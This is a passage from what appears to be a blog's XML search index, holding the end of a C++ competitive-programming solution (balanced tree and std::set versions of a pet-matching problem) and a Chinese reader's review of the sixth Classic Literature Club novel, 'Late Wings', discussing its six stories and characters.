class="params">(<span class="type">int</span> num)</span><span class="comment">//匹配宠物和饲养人</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a,b;</span><br><span class="line">    <span class="built_in">pre</span>(k,num),a=T[ANS].val; </span><br><span class="line">    <span class="built_in">next</span>(k,num), b=T[ANS].val;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(num-a&lt;=b-num &amp;&amp; a != -INF) &#123;</span><br><span class="line">            ans += num-a;</span><br><span class="line">            <span class="built_in">del</span>(k,a);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ans += b-num;</span><br><span class="line">            <span class="built_in">del</span>(k,b);</span><br><span class="line">        &#125;</span><br><span class="line">        ans %= <span class="number">1000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">        <span class="type">int</span> cur;</span><br><span class="line">        <span class="built_in">ins</span>(k,-INF),<span class="built_in">ins</span>(k,INF);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> a, b;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">            <span class="keyword">if</span>(T[k].size == <span class="number">2</span>) &#123;</span><br><span class="line">                cur=a;<span class="comment">//cur：当前是宠物等人认领还是人在等着接受宠物（看原题，不然谁看得懂啊= =）</span></span><br><span class="line">                <span class="built_in">ins</span>(k,b);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(a == cur) <span class="built_in">ins</span>(k,b);</span><br><span class="line">            <span class="keyword">else</span> <span class="built_in">Catch</span>(b);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ans);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">```  </span><br><span class="line"><span class="number">2.</span> set实现(<span class="number">304</span>ms,<span class="number">2.57</span>MB)  </span><br><span class="line">```cpp</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">1111111</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> INF = <span class="number">1000000000</span>;</span><br><span class="line"><span class="type">int</span> n, ans;</span><br><span class="line">set &lt;<span class="type">int</span>&gt; s;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    set&lt;<span class="type">int</span>&gt;::iterator left=--s.<span class="built_in">lower_bound</span>(x),right=s.<span class="built_in">lower_bound</span>(x);<span class="comment">//lower_bound的实现是二分查找，迭代器指向不比x小的且最接近x的数的位置，所以left就是前继，right就是后继</span></span><br><span class="line">    <span class="keyword">if</span>(x-*left&lt;=*right-x&amp;&amp;*left!=-INF) &#123;</span><br><span class="line">        ans+=x-*left;</span><br><span class="line">        s.<span class="built_in">erase</span>(left);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ans+=*right-x;</span><br><span class="line">        s.<span class="built_in">erase</span>(right);</span><br><span class="line">    &#125;</span><br><span class="line">    ans%=<span class="number">1000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="type">int</span> cur;</span><br><span class="line">    s.<span class="built_in">insert</span>(-INF),s.<span class="built_in">insert</span>(INF);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</span><br><span class="line">        <span class="type">int</span> a,b;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">        <span class="keyword">if</span>(s.<span class="built_in">size</span>()==<span class="number">2</span>) &#123;</span><br><span class="line">            cur=a;</span><br><span class="line">            s.<span class="built_in">insert</span>(b);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(a==cur) s.<span class="built_in">insert</span>(b);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">find</span>(b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Treap </tag>
            
            <tag> Splay </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>古籍研究社系列第6部《迟来的翅膀》读后感……吗？</title>
      <link href="/2018/03/15/%E5%8F%A4%E7%B1%8D%E7%A0%94%E7%A9%B6%E7%A4%BE%E7%B3%BB%E5%88%97%E7%AC%AC6%E9%83%A8%E3%80%8A%E8%BF%9F%E6%9D%A5%E7%9A%84%E7%BF%85%E8%86%80%E3%80%8B%E8%AF%BB%E5%90%8E%E6%84%9F%E2%80%A6%E2%80%A6%E5%90%97%EF%BC%9F/"/>
      <url>/2018/03/15/%E5%8F%A4%E7%B1%8D%E7%A0%94%E7%A9%B6%E7%A4%BE%E7%B3%BB%E5%88%97%E7%AC%AC6%E9%83%A8%E3%80%8A%E8%BF%9F%E6%9D%A5%E7%9A%84%E7%BF%85%E8%86%80%E3%80%8B%E8%AF%BB%E5%90%8E%E6%84%9F%E2%80%A6%E2%80%A6%E5%90%97%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="前言准备看之前，我留意到这本书与前几本有些许不同。英文的副标题消失了。封面的配图是天台，是一种生动明晰的色彩吧。天空与天台染上绿色调不知道为什么令我留意了许久。主要还是封底的文字令我很在意：之前几本都只是在此抛出悬念-x2F-疑问，令读者于书中找到答案，而这里却在后面附上了这样的文字：“全书分为六个短篇，在充满活力又带点苦涩的故事里，古籍研究社四名成员的过去和未来也逐渐明朗……”语气应该很平淡吧，但是仿佛一直在暗示我这一部不简单。这句话在试图传达着什么吗？已经确定了全书的基调吗？我很好奇。-故事1：《箱内的缺失》案件本身不复杂。投票的票数比人数多，于是里志向折木求助。在2人的散步与对话中，真相逐渐浮出水面。回望同系列第5部《两人距离的概算》，全书用折木于“星谷杯”长跑中的思考串联，此处手法与其颇为相似。古籍研究社系列的故事往往不在案件本身。想想封底的话，不难猜到此处写的是里志的转变。第三部《库特利亚芙卡的顺序》中，里志总是念叨着“数据库是得不出结论的”这样的话。（顺带一提，第三部对四人的形象刻画很生动，个人很喜欢。）然而之所以一直念叨，想必也是因为本人不甘心——尽管那时里志也试着推理，不过他发现自己做不到。而在此，里志明显接受了自己没有折木那样的才能的事实，思想上已经做了转变，他依旧是那个在街机游戏中输了也笑得灿烂的里志。不过里志对公平正义的执着、对自己认为正确的事物的坚持从未改变。若非如此，他便不会为学弟打抱不平，便不会去请求折木解谜。变与不变，把里志形象刻画的极为鲜明。这个故事真正想要表达的是这样吧。-故事2：《镜中不得见》用摩耶花的视角探寻折木的过去——有意思的视角。早已疑惑摩耶花之前为什么会讨厌折木，本篇则进行了解答，毕竟古籍研究社系列向来是重点在于案件背后。他的初中同学们会讨厌他仅仅是因为一次误会，而折木选择了沉默。在摩耶花的好奇心驱使下，终于了解了折木所作所为的原因。在摩耶花道歉之后，折木看似漫不经心，但是一句“折木的视线游移不定”的描写展现了他内心的深受触动。这一篇故事刻画了折木做好事不留名的“英雄”形象，其实也侧面反映了折木本身并不消极。折木骨子里和里志是一样的，千反田只是唤醒了他的激情。个人认为此文涉及到了校园欺凌，从旁观者的角度出发展现了校园“冷暴力”的可怕。旁观者不应旁观。若直接介入不妥，暗中帮助不失为一种好方法——米泽穗信也许想传达的是这个。不得见的，真的在镜中吗？-故事3：《群山已放晴？》折木探明了实际上不喜欢直升机的老师在某日早晨说出“我喜欢直升机”的缘由。看到一半的时候其实大部分人便都能模模糊糊猜到缘由了。当然重点依旧不在案件上。折木说出“我很好奇”的时候，无论里志、千反田、摩耶花还是读者都会大吃一惊吧。这则故事不长，像是一种过渡。然而说到过渡就会想到转变——节能主义的折木开始渴望本书中所说的“玫瑰色的人生”。某种程度上，折木已经放弃了节能主义。千反田是引子，根本动力是同里志一样的、内心深处对某些东西的执着和渴望。我相信里志在整个系列中更像是折木的真我之体现。通过两人表现的差异，便能看出折木距离真正的自我还有多远。这是我对里志的理解：折木内心的镜像。-故事4：《我们的传说之书》摩耶花的视角。真相的揭示者就是“凶手”本人，十分有趣。本文探讨了一个问题：个体在集体之中，应该为了集体的利益而牺牲自己，还是应该为了自己的前途而放弃集体？河内学姐自己退出漫研，却安排羽仁担任社长，怎可谓放下？而其劝摩耶花退出也是为了漫研与摩耶花的利益最大化。现实生活往往不会出现故事中漫研完全两极分化的情况。无论做出什么选择，总有人要受伤。因此，我更倾向于遵循自己的本心。摩耶花的选择也许不一定正确，更有可能根本无对错之分，但她至少遵从了自己的本心。-故事5：《悠长的假期》这则故事详细说明了折木成为节能主义者的原因。故事的结尾借折木的姐姐之口说了这么一句话：“今后你会迎来悠长的假期，这样也好，你就好好休息吧，没问题，身体休息的时候，内心必须有所改变。”这里的“悠长假期”其实是一语三关，既实指折木即将迎来的漫长暑假，也暗指折木之后漫漫无期的节能主义生活，更指的是内心的缓慢改变。“身体休息的时候，内心必须有所改变”，暗喻了折木即将变成一个节能主义者，节能主义生活中内心却并不坚定，终将转变思想。故事最后又加了一句：“也会有人来结束你这悠长的假期。”说明暑假终将过去，节能主义的生活将不再，内心最终也会完成转变，更加成熟。米泽穗信刻意安排折木和千反田二人在这个故事里互动，传达着所谓的“有人”就是千反田，本文是官方发糖的铺垫之一。-故事6：《迟来的翅膀》不简单的一部书的最后一章，且标题和书的标题相同，暗示着其分量之重。米泽穗信更为用心地去刻画了人物形象。篇幅上稍长，故事的架构和立意更是高明，具备丰富的戏剧性和思想。前面几个故事都是在讲折木、福部和伊原，最后一个自然留给了千反田爱瑠。“案件”的起因是有一天千反田的父亲突然告诉她不一定要再继承家业了。比喻为一道选择题的话，“不必须”就意味着即可用选继承家业，也可以选择不继承，因此在我们看来这实是一道开放的送分题，选择什么都可以，出路变多了，应该开心才对，在旁人看来千反田根本不必这么烦恼，然而在千反田眼中情况却并非如此。因为她不明白该不该用这迟来的翅膀展翅飞翔。不禁想说小说读来总是弥漫着一种淡淡的苦涩（如同封底文字所说），远没有动画来的明快。第一部《冰菓》的I-scream已经为整个系列奠定了基调。第一部书中千反田的舅舅关谷纯曾这样跟年幼的千反田解释“冰菓”：“是要变坚强的意思。如果软弱的话，总有一天会连悲鸣都发不出来。这样的话，就算活着，也只是行尸走肉。”作者借舅舅之口说这段话暗指的自然是身为家族继承人的千反田的某种命运，这也是为什么年幼的千反田在听完舅舅的这句话后就哭了。她内心一定是对自己“笼中鸟”的命运做过某种抗争的，但她认为这种抗争无法改变什么，于是就此放弃。然而有一天这件事真的成真了，这个时候千反田才发现自己并没有为此做过任何准备，甚至连这件事本身是不是自己真的想要的也要重新思考，这个时候才真正开始惶恐。折木对这种心理有一个很有趣的比喻：好比有些不信耶稣的人唱赞歌会觉得别扭一样。原本没有自由的千反田能唱出憧憬自由的歌词，但当她真正有了自由后反而唱不出来了，看似矛盾，实则符合人物心境。正如故事的标题《迟来的翅膀》所想传达给我们的意义：笼中的鸟儿会憧憬自由，然而打开鸟笼后，它们却会因迟来的翅膀而恐惧。其实，本书的另一个译名“事到如今才叫我飞翔”更贴近原日文标题的直译，大可以体会一下个中含义。“这迟来的翅膀，让我不知所措。”千反田说出的这句话冲击力巨大。忽然而至的自由，充满未知与可能性的人生，如此之大的冲击，必然动摇了千反田多年来作为千金千反田所存在的意义。即使我们不知道千反田原本愿意被继承人的身份束缚与否，也不知道她是否真的渴望自由，但能确定的是，她面对无限可能性时的迷茫绝不会持久。故事在折木找到千反田后戛然而止，并没有给出答案，也就是说做出什么选择已经不重要了。因为这个命题不是我们每一个人需要思考的：-真正束缚我们的到底是什么？是无形的命运牢笼，还是对改变的恐惧？-这本书没有后记，再怎么看最后一页都只是冷冰冰的图书在版编目数据，我相信没有后记是因为米泽穗信希望最后这几段对话能久久留存在读者脑海，毕竟这部书相较于前几部很特别。不过令人愉悦的是，此处古籍研究社系列的另一条线渐渐浮出：折木与千反田的关系。千反田引导了折木重新渴望玫瑰色的人生，动摇了折木“节能主义”的信条，成为了结束折木“悠长的假期”的那个人。可以说，折木已经喜欢上了她。既然千反田的迷茫不会持久，因为此次经历，千反田在此之后必然会和折木加深羁绊。请期待吧。-PS……？：说是校园推理的小说，但实际上许多探讨的事物一点也不校园，更不是为了推理而推理，更多的是对成长、社会、人生价值的思考。与其说是轻小说，我偏向于认为这是纯文学。不管怎么说，我喜欢。希望大家能分享一下关于这本书的感想吧。"><a href="#前言准备看之前，我留意到这本书与前几本有些许不同。英文的副标题消失了。封面的配图是天台，是一种生动明晰的色彩吧。天空与天台染上绿色调不知道为什么令我留意了许久。主要还是封底的文字令我很在意：之前几本都只是在此抛出悬念-x2F-疑问，令读者于书中找到答案，而这里却在后面附上了这样的文字：“全书分为六个短篇，在充满活力又带点苦涩的故事里，古籍研究社四名成员的过去和未来也逐渐明朗……”语气应该很平淡吧，但是仿佛一直在暗示我这一部不简单。这句话在试图传达着什么吗？已经确定了全书的基调吗？我很好奇。-故事1：《箱内的缺失》案件本身不复杂。投票的票数比人数多，于是里志向折木求助。在2人的散步与对话中，真相逐渐浮出水面。回望同系列第5部《两人距离的概算》，全书用折木于“星谷杯”长跑中的思考串联，此处手法与其颇为相似。古籍研究社系列的故事往往不在案件本身。想想封底的话，不难猜到此处写的是里志的转变。第三部《库特利亚芙卡的顺序》中，里志总是念叨着“数据库是得不出结论的”这样的话。（顺带一提，第三部对四人的形象刻画很生动，个人很喜欢。）然而之所以一直念叨，想必也是因为本人不甘心——尽管那时里志也试着推理，不过他发现自己做不到。而在此，里志明显接受了自己没有折木那样的才能的事实，思想上已经做了转变，他依旧是那个在街机游戏中输了也笑得灿烂的里志。不过里志对公平正义的执着、对自己认为正确的事物的坚持从未改变。若非如此，他便不会为学弟打抱不平，便不会去请求折木解谜。变与不变，把里志形象刻画的极为鲜明。这个故事真正想要表达的是这样吧。-故事2：《镜中不得见》用摩耶花的视角探寻折木的过去——有意思的视角。早已疑惑摩耶花之前为什么会讨厌折木，本篇则进行了解答，毕竟古籍研究社系列向来是重点在于案件背后。他的初中同学们会讨厌他仅仅是因为一次误会，而折木选择了沉默。在摩耶花的好奇心驱使下，终于了解了折木所作所为的原因。在摩耶花道歉之后，折木看似漫不经心，但是一句“折木的视线游移不定”的描写展现了他内心的深受触动。这一篇故事刻画了折木做好事不留名的“英雄”形象，其实也侧面反映了折木本身并不消极。折木骨子里和里志是一样的，千反田只是唤醒了他的激情。个人认为此文涉及到了校园欺凌，从旁观者的角度出发展现了校园“冷暴力”的可怕。旁观者不应旁观。若直接介入不妥，暗中帮助不失为一种好方法——米泽穗信也许想传达的是这个。不得见的，真的在镜中吗？-故事3：《群山已放晴？》折木探明了实际上不喜欢直升机的老师在某日早晨说出“我喜欢直升机”的缘由。看到一半的时候其实大部分人便都能模模糊糊猜到缘由了。当然重点依旧不在案件上。折木说出“我很好奇”的时候，无论里志、千反田、摩耶花还是读者都会大吃一惊吧。这则故事不长，像是一种过渡。然而说到过渡就会想到转变——节能主义的折木开始渴望本书中所说的“玫瑰色的人生”。某种程度上，折木已经放弃了节能主义。千反田是引子，根本动力是同里志一样的、内心深处对某些东西的执着和渴望。我相信里志在整个系列中更像是折木的真我之体现。通过两人表现的差异，便能看出折木距离真正的自我还有多远。这是我对里志的理解：折木内心的镜像。-故事4：《我们的传说之书》摩耶花的视角。真相的揭示者就是“凶手”本人，十分有趣。本文探讨了一个问题：个体在集体之中，应该为了集体的利益而牺牲自己，还是应该为了自己的前途而放弃集体？河内学姐自己退出漫研，却安排羽仁担任社长，怎可谓放下？而其劝摩耶花退出也是为了漫研与摩耶花的利益最大化。现实生活往往不会出现故事中漫研完全两极分化的情况。无论做出什么选择，总有人要受伤。因此，我更倾向于遵循自己的本心。摩耶花的选择也许不一定正确，更有可能根本无对错之分，但她至少遵从了自己的本心。-故事5：《悠长的假期》这则故事详细说明了折木成为节能主义者的原因。故事的结尾借折木的姐姐之口说了这么一句话：“今后你会迎来悠长的假期，这样也好，你就好好休息吧，没问题，身体休息的时候，内心必须有所改变。”这里的“悠长假期”其实是一语三关，既实指折木即将迎来的漫长暑假，也暗指折木之后漫漫无期的节能主义生活，更指的是内心的缓慢改变。“身体休息的时候，内心必须有所改变”，暗喻了折木即将变成一个节能主义者，节能主义生活中内心却并不坚定，终将转变思想。故事最后又加了一句：“也会有人来结束你这悠长的假期。”说明暑假终将过去，节能主义的生活将不再，内心最终也会完成转变，更加成熟。米泽穗信刻意安排折木和千反田二人在这个故事里互动，传达着所谓的“有人”就是千反田，本文是官方发糖的铺垫之一。-故事6：《迟来的翅膀》不简单的一部书的最后一章，且标题和书的标题相同，暗示着其分量之重。米泽穗信更为用心地去刻画了人物形象。篇幅上稍长，故事的架构和立意更是高明，具备丰富的戏剧性和思想。前面几个故事都是在讲折木、福部和伊原，最后一个自然留给了千反田爱瑠。“案件”的起因是有一天千反田的父亲突然告诉她不一定要再继承家业了。比喻为一道选择题的话，“不必须”就意味着即可用选继承家业，也可以选择不继承，因此在我们看来这实是一道开放的送分题，选择什么都可以，出路变多了，应该开心才对，在旁人看来千反田根本不必这么烦恼，然而在千反田眼中情况却并非如此。因为她不明白该不该用这迟来的翅膀展翅飞翔。不禁想说小说读来总是弥漫着一种淡淡的苦涩（如同封底文字所说），远没有动画来的明快。第一部《冰菓》的I-scream已经为整个系列奠定了基调。第一部书中千反田的舅舅关谷纯曾这样跟年幼的千反田解释“冰菓”：“是要变坚强的意思。如果软弱的话，总有一天会连悲鸣都发不出来。这样的话，就算活着，也只是行尸走肉。”作者借舅舅之口说这段话暗指的自然是身为家族继承人的千反田的某种命运，这也是为什么年幼的千反田在听完舅舅的这句话后就哭了。她内心一定是对自己“笼中鸟”的命运做过某种抗争的，但她认为这种抗争无法改变什么，于是就此放弃。然而有一天这件事真的成真了，这个时候千反田才发现自己并没有为此做过任何准备，甚至连这件事本身是不是自己真的想要的也要重新思考，这个时候才真正开始惶恐。折木对这种心理有一个很有趣的比喻：好比有些不信耶稣的人唱赞歌会觉得别扭一样。原本没有自由的千反田能唱出憧憬自由的歌词，但当她真正有了自由后反而唱不出来了，看似矛盾，实则符合人物心境。正如故事的标题《迟来的翅膀》所想传达给我们的意义：笼中的鸟儿会憧憬自由，然而打开鸟笼后，它们却会因迟来的翅膀而恐惧。其实，本书的另一个译名“事到如今才叫我飞翔”更贴近原日文标题的直译，大可以体会一下个中含义。“这迟来的翅膀，让我不知所措。”千反田说出的这句话冲击力巨大。忽然而至的自由，充满未知与可能性的人生，如此之大的冲击，必然动摇了千反田多年来作为千金千反田所存在的意义。即使我们不知道千反田原本愿意被继承人的身份束缚与否，也不知道她是否真的渴望自由，但能确定的是，她面对无限可能性时的迷茫绝不会持久。故事在折木找到千反田后戛然而止，并没有给出答案，也就是说做出什么选择已经不重要了。因为这个命题不是我们每一个人需要思考的：-真正束缚我们的到底是什么？是无形的命运牢笼，还是对改变的恐惧？-这本书没有后记，再怎么看最后一页都只是冷冰冰的图书在版编目数据，我相信没有后记是因为米泽穗信希望最后这几段对话能久久留存在读者脑海，毕竟这部书相较于前几部很特别。不过令人愉悦的是，此处古籍研究社系列的另一条线渐渐浮出：折木与千反田的关系。千反田引导了折木重新渴望玫瑰色的人生，动摇了折木“节能主义”的信条，成为了结束折木“悠长的假期”的那个人。可以说，折木已经喜欢上了她。既然千反田的迷茫不会持久，因为此次经历，千反田在此之后必然会和折木加深羁绊。请期待吧。-PS……？：说是校园推理的小说，但实际上许多探讨的事物一点也不校园，更不是为了推理而推理，更多的是对成长、社会、人生价值的思考。与其说是轻小说，我偏向于认为这是纯文学。不管怎么说，我喜欢。希望大家能分享一下关于这本书的感想吧。" class="headerlink" title="###前言准备看之前，我留意到这本书与前几本有些许不同。英文的副标题消失了。封面的配图是天台，是一种生动明晰的色彩吧。天空与天台染上绿色调不知道为什么令我留意了许久。主要还是封底的文字令我很在意：之前几本都只是在此抛出悬念&#x2F;疑问，令读者于书中找到答案，而这里却在后面附上了这样的文字：“全书分为六个短篇，在充满活力又带点苦涩的故事里，古籍研究社四名成员的过去和未来也逐渐明朗……”语气应该很平淡吧，但是仿佛一直在暗示我这一部不简单。这句话在试图传达着什么吗？已经确定了全书的基调吗？我很好奇。###故事1：《箱内的缺失》案件本身不复杂。投票的票数比人数多，于是里志向折木求助。在2人的散步与对话中，真相逐渐浮出水面。回望同系列第5部《两人距离的概算》，全书用折木于“星谷杯”长跑中的思考串联，此处手法与其颇为相似。古籍研究社系列的故事往往不在案件本身。想想封底的话，不难猜到此处写的是里志的转变。第三部《库特利亚芙卡的顺序》中，里志总是念叨着“数据库是得不出结论的”这样的话。（顺带一提，第三部对四人的形象刻画很生动，个人很喜欢。）然而之所以一直念叨，想必也是因为本人不甘心——尽管那时里志也试着推理，不过他发现自己做不到。而在此，里志明显接受了自己没有折木那样的才能的事实，思想上已经做了转变，他依旧是那个在街机游戏中输了也笑得灿烂的里志。不过里志对公平正义的执着、对自己认为正确的事物的坚持从未改变。若非如此，他便不会为学弟打抱不平，便不会去请求折木解谜。变与不变，把里志形象刻画的极为鲜明。这个故事真正想要表达的是这样吧。###故事2：《镜中不得见》用摩耶花的视角探寻折木的过去——有意思的视角。早已疑惑摩耶花之前为什么会讨厌折木，本篇则进行了解答，毕竟古籍研究社系列向来是重点在于案件背后。他的初中同学们会讨厌他仅仅是因为一次误会，而折木选择了沉默。在摩耶花的好奇心驱使下，终于了解了折木所作所为的原因。在摩耶花道歉之后，折木看似漫不经心，但是一句“折木的视线游移不定”的描写展现了他内心的深受触动。这一篇故事刻画了折木做好事不留名的“英雄”形象，其实也侧面反映了折木本身并不消极。折木骨子里和里志是一样的，千反田只是唤醒了他的激情。个人认为此文涉及到了校园欺凌，从旁观者的角度出发展现了校园“冷暴力”的可怕。旁观者不应旁观。若直接介入不妥，暗中帮助不失为一种好方法——米泽穗信也许想传达的是这个。不得见的，真的在镜中吗？###故事3：《群山已放晴？》折木探明了实际上不喜欢直升机的老师在某日早晨说出“我喜欢直升机”的缘由。看到一半的时候其实大部分人便都能模模糊糊猜到缘由了。当然重点依旧不在案件上。折木说出“我很好奇”的时候，无论里志、千反田、摩耶花还是读者都会大吃一惊吧。这则故事不长，像是一种过渡。然而说到过渡就会想到转变——节能主义的折木开始渴望本书中所说的“玫瑰色的人生”。某种程度上，折木已经放弃了节能主义。千反田是引子，根本动力是同里志一样的、内心深处对某些东西的执着和渴望。我相信里志在整个系列中更像是折木的真我之体现。通过两人表现的差异，便能看出折木距离真正的自我还有多远。这是我对里志的理解：折木内心的镜像。###故事4：《我们的传说之书》摩耶花的视角。真相的揭示者就是“凶手”本人，十分有趣。本文探讨了一个问题：个体在集体之中，应该为了集体的利益而牺牲自己，还是应该为了自己的前途而放弃集体？河内学姐自己退出漫研，却安排羽仁担任社长，怎可谓放下？而其劝摩耶花退出也是为了漫研与摩耶花的利益最大化。现实生活往往不会出现故事中漫研完全两极分化的情况。无论做出什么选择，总有人要受伤。因此，我更倾向于遵循自己的本心。摩耶花的选择也许不一定正确，更有可能根本无对错之分，但她至少遵从了自己的本心。###故事5：《悠长的假期》这则故事详细说明了折木成为节能主义者的原因。故事的结尾借折木的姐姐之口说了这么一句话：“今后你会迎来悠长的假期，这样也好，你就好好休息吧，没问题，身体休息的时候，内心必须有所改变。”这里的“悠长假期”其实是一语三关，既实指折木即将迎来的漫长暑假，也暗指折木之后漫漫无期的节能主义生活，更指的是内心的缓慢改变。“身体休息的时候，内心必须有所改变”，暗喻了折木即将变成一个节能主义者，节能主义生活中内心却并不坚定，终将转变思想。故事最后又加了一句：“也会有人来结束你这悠长的假期。”说明暑假终将过去，节能主义的生活将不再，内心最终也会完成转变，更加成熟。米泽穗信刻意安排折木和千反田二人在这个故事里互动，传达着所谓的“有人”就是千反田，本文是官方发糖的铺垫之一。###故事6：《迟来的翅膀》不简单的一部书的最后一章，且标题和书的标题相同，暗示着其分量之重。米泽穗信更为用心地去刻画了人物形象。篇幅上稍长，故事的架构和立意更是高明，具备丰富的戏剧性和思想。前面几个故事都是在讲折木、福部和伊原，最后一个自然留给了千反田爱瑠。“案件”的起因是有一天千反田的父亲突然告诉她不一定要再继承家业了。比喻为一道选择题的话，“不必须”就意味着即可用选继承家业，也可以选择不继承，因此在我们看来这实是一道开放的送分题，选择什么都可以，出路变多了，应该开心才对，在旁人看来千反田根本不必这么烦恼，然而在千反田眼中情况却并非如此。因为她不明白该不该用这迟来的翅膀展翅飞翔。不禁想说小说读来总是弥漫着一种淡淡的苦涩（如同封底文字所说），远没有动画来的明快。第一部《冰菓》的I scream已经为整个系列奠定了基调。第一部书中千反田的舅舅关谷纯曾这样跟年幼的千反田解释“冰菓”：“是要变坚强的意思。如果软弱的话，总有一天会连悲鸣都发不出来。这样的话，就算活着，也只是行尸走肉。”作者借舅舅之口说这段话暗指的自然是身为家族继承人的千反田的某种命运，这也是为什么年幼的千反田在听完舅舅的这句话后就哭了。她内心一定是对自己“笼中鸟”的命运做过某种抗争的，但她认为这种抗争无法改变什么，于是就此放弃。然而有一天这件事真的成真了，这个时候千反田才发现自己并没有为此做过任何准备，甚至连这件事本身是不是自己真的想要的也要重新思考，这个时候才真正开始惶恐。折木对这种心理有一个很有趣的比喻：好比有些不信耶稣的人唱赞歌会觉得别扭一样。原本没有自由的千反田能唱出憧憬自由的歌词，但当她真正有了自由后反而唱不出来了，看似矛盾，实则符合人物心境。正如故事的标题《迟来的翅膀》所想传达给我们的意义：笼中的鸟儿会憧憬自由，然而打开鸟笼后，它们却会因迟来的翅膀而恐惧。其实，本书的另一个译名“事到如今才叫我飞翔”更贴近原日文标题的直译，大可以体会一下个中含义。“这迟来的翅膀，让我不知所措。”千反田说出的这句话冲击力巨大。忽然而至的自由，充满未知与可能性的人生，如此之大的冲击，必然动摇了千反田多年来作为千金千反田所存在的意义。即使我们不知道千反田原本愿意被继承人的身份束缚与否，也不知道她是否真的渴望自由，但能确定的是，她面对无限可能性时的迷茫绝不会持久。故事在折木找到千反田后戛然而止，并没有给出答案，也就是说做出什么选择已经不重要了。因为这个命题不是我们每一个人需要思考的：**真正束缚我们的到底是什么？是无形的命运牢笼，还是对改变的恐惧？  **这本书没有后记，再怎么看最后一页都只是冷冰冰的图书在版编目数据，我相信没有后记是因为米泽穗信希望最后这几段对话能久久留存在读者脑海，毕竟这部书相较于前几部很特别。不过令人愉悦的是，此处古籍研究社系列的另一条线渐渐浮出：折木与千反田的关系。千反田引导了折木重新渴望玫瑰色的人生，动摇了折木“节能主义”的信条，成为了结束折木“悠长的假期”的那个人。可以说，折木已经喜欢上了她。既然千反田的迷茫不会持久，因为此次经历，千反田在此之后必然会和折木加深羁绊。请期待吧。##PS……？：说是校园推理的小说，但实际上许多探讨的事物一点也不校园，更不是为了推理而推理，更多的是对成长、社会、人生价值的思考。与其说是轻小说，我偏向于认为这是纯文学。不管怎么说，我喜欢。希望大家能分享一下关于这本书的感想吧。"></a>###前言<br>准备看之前，我留意到这本书与前几本有些许不同。<br>英文的副标题消失了。封面的配图是天台，是一种生动明晰的色彩吧。天空与天台染上绿色调不知道为什么令我留意了许久。<br>主要还是封底的文字令我很在意：之前几本都只是在此抛出悬念&#x2F;疑问，令读者于书中找到答案，而这里却在后面附上了这样的文字：<br><strong>“全书分为六个短篇，在充满活力又带点苦涩的故事里，古籍研究社四名成员的过去和未来也逐渐明朗……”</strong><br>语气应该很平淡吧，但是仿佛一直在暗示我这一部不简单。这句话在试图传达着什么吗？已经确定了全书的基调吗？<br><strong>我很好奇。</strong><br>###故事1：《箱内的缺失》<br>案件本身不复杂。投票的票数比人数多，于是里志向折木求助。在2人的散步与对话中，真相逐渐浮出水面。回望同系列第5部《两人距离的概算》，全书用折木于“星谷杯”长跑中的思考串联，此处手法与其颇为相似。<br><strong>古籍研究社系列的故事往往不在案件本身。</strong><br>想想封底的话，不难猜到此处写的是里志的转变。第三部《库特利亚芙卡的顺序》中，里志总是念叨着“数据库是得不出结论的”这样的话。（顺带一